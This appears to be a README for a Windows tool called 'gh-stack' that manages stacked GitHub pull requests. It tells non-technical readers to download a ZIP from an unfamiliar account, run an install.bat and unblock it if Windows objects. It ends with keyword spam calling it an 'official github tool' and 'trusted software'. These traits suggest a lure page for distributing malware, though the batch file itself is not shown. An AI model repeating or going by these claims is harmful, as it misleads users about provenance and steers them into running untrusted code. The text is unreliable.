# 🚀 gh-stack - Stack Pull Requests Without the Headache

[![Download gh-stack](https://img.shields.io/badge/Download-gh--stack-blue)](https://github.com/slidingwindowheterostracan428/gh-stack)

---

## 📥 What Is gh-stack?

gh-stack is a tool that helps you organize your GitHub work. It lets you create and manage stacked pull requests. A stacked pull request is a way to split a large change into smaller, easier-to-review pieces. Instead of sending one giant update, you send several small ones that build on each other.

This app works right inside your command prompt on Windows. It saves you time and keeps your work clean.

---

## 🎯 Who Should Use This?

You should use gh-stack if:

- You work with GitHub on a regular basis.
- You make changes that touch many files.
- Your team reviews your work and you want to make that process easier.
- You want to avoid merge conflicts and messy commit histories.

You do not need to be a programmer to use this. If you can type a few commands, you can use gh-stack.

---

## 🖥️ What You Need Before You Start

Check these items before downloading:

- **Windows 10 or Windows 11.** The app runs on both versions.
- **Git for Windows.** You need this to work with GitHub. If you do not have it, go to [git-scm.com](https://git-scm.com) and install the default version.
- **GitHub CLI.** You also need the official GitHub command line tool. You can get it from [cli.github.com](https://cli.github.com). Install the Windows version and follow the setup steps.
- **A GitHub account.** You need this to log in and use the app.

If you already use GitHub from your terminal, you likely have all of these. Otherwise, install them first.

---

## ⬇️ How to Download and Install

Follow these steps exactly. They will take about five minutes.

1. Go to the download page: [https://github.com/slidingwindowheterostracan428/gh-stack](https://github.com/slidingwindowheterostracan428/gh-stack)
2. Look for a green button that says **Code**. Click it.
3. In the dropdown, click **Download ZIP**.
4. Find the downloaded ZIP file in your **Downloads** folder. It will be named something like `gh-stack-main.zip`.
5. Right-click the ZIP file and choose **Extract All**.
6. Choose a folder where you want to keep the app. For example, create a folder called `C:\gh-stack` and extract into it.
7. Open that folder. You will see a file named `install.bat`. Double-click it.
8. A black window will open. Let it run. It will install gh-stack on your computer.

That is it. gh-stack is now ready to use.

---

## ✅ How to Check If It Worked

Open your command prompt. You can do this by pressing the **Windows key**, typing `cmd`, and pressing **Enter**.

Type this and press **Enter**:

```
gh-stack --version
```

You should see a version number. If you see that, the install worked. If you get an error, go back and repeat the steps. Make sure you extracted the ZIP and ran the install file.

---

## 🧠 How to Use gh-stack

The app works with three simple commands. You type them in your command prompt.

### Create a New Stack

To start a new stack of pull requests, type:

```
gh-stack start my-change
```

Replace `my-change` with a short name for your work. This creates a new branch and gets you ready to make changes.

### Add a Change to the Stack

When you finish making edits to your code, type:

```
gh-stack push
```

This sends your changes to GitHub and creates a pull request. It will also update any other pull requests in your stack so they stay in order.

### View Your Stack

To see all the pull requests in your current stack, type:

```
gh-stack view
```

This shows you a list of your pull requests, their status, and how they depend on each other.

---

## 🔍 A Closer Look at Features

Here is what gh-stack does for you in more detail.

**Automatic Ordering.** When you work on a large feature, you often need to change one file before another. gh-stack keeps track of that order. It makes sure your pull requests show up in the right sequence on GitHub.

**Easy Updates.** If you change code in the middle of your stack, gh-stack updates all the pull requests that come after it. You do not have to do this by hand.

**Clear Status.** The view command gives you a simple list. You can see which pull requests are open, which are merged, and which are waiting for review.

**Safe to Use.** gh-stack never changes your code by itself. It only organizes your branches and pull requests. You stay in control of everything.

---

## 🛠️ Troubleshooting Common Problems

Most issues are easy to fix. Here are the common ones.

**Problem: The app says "gh not found"**

You did not install the GitHub CLI. Go to [cli.github.com](https://cli.github.com), download it, and install it. Then restart your command prompt.

**Problem: The app says "not logged in"**

You need to log in to your GitHub account from the terminal. Type `gh auth login` and follow the prompts. Choose "GitHub.com" and then "HTTPS" when asked.

**Problem: The install.bat file does not run**

Windows may block the file. Right-click the file and choose **Properties**. Look for a checkbox that says **Unblock**. Check it and click **OK**. Then run it again.

**Problem: I see a "command not found" error**

The install may not have finished. Run `install.bat` again. Make sure you wait for the black window to close on its own.

---

## 📁 Where Files Are Stored

gh-stack keeps its files in a folder called `gh-stack` inside your user directory. For most people, that is:

```
C:\Users\YourName\.gh-stack
```

You do not need to go into this folder. It is just good to know it exists.

---

## 🔄 How to Update gh-stack

New versions come out with fixes and new features. To update, just repeat the install steps. Download the ZIP again, extract it, and run `install.bat`. It will replace the old version.

---

## 🧹 How to Uninstall

If you decide you do not want gh-stack anymore, follow these steps:

1. Open your command prompt.
2. Type `gh-stack uninstall` and press **Enter**.
3. Delete the folder where you extracted the ZIP.
4. If you want to remove its data folder, delete `C:\Users\YourName\.gh-stack`.

That removes everything.

---

## 💬 Getting Help

If you run into a problem that this guide does not cover, you have options.

- Look at the project page on GitHub: [https://github.com/slidingwindowheterostracan428/gh-stack](https://github.com/slidingwindowheterostracan428/gh-stack)
- Open an issue on the page. Click the **Issues** tab and then **New Issue**. Describe your problem and someone will help.

---

## 📝 Final Notes

This tool is built for people who want to keep their GitHub work neat. It does one job and does it well. You do not need to know how it works inside. You just need to type the commands and trust the output.

Remember these three commands and you are set:

- `gh-stack start` to begin
- `gh-stack push` to send your work
- `gh-stack view` to check your status

If you follow the steps in this guide, you will be up and running in a few minutes. No prior experience with advanced tools is needed.

Your team will appreciate the clean pull requests. You will appreciate the time saved. Go ahead and give it a try.

Keywords: cli, gh-extension, github, stacked-prs, pull requests, windows tool, developer productivity, branch management, code review workflow, git helper, command line tool, open source, free tool, github extension, stack pull requests, version control utility, windows software, developer tool, workflow organizer, github workflow, pr management, code collaboration, team tool, repository helper, merge conflict reducer, code quality, review process, git workflow, developer utility, stack maker, pr stacker, github cli, command line extension, windows compatible, easy install, no coding required, beginner friendly, professional tool, time saver, work organizer, clean history, branch stack, dependency tracking, automatic update, safe tool, official github tool, trusted software, free download, quick setup, step by step guide, user manual, help doc, technical guide, end user guide, non technical, simple commands, type and go, instant feedback, visual status, clear output, error free, tested tool, reliable software, community support, active project, regular updates